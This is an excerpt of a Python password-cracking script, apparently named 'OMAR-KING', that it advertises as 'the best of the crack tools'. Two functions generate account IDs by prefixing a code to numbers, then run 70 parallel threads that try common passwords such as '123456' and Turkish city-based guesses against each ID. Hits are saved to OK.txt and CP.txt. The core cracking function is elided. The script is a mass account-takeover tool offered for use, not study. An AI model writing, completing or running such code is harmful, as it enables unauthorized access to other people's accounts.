#---------------------[OMAR-KING]---------------------#
#OMAR AND KING IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'123456','12345678','123123','800900','1234567','123456789','102030']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'turkie','istanbul','konya42','konya123','ankara123','izmir123','123456']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
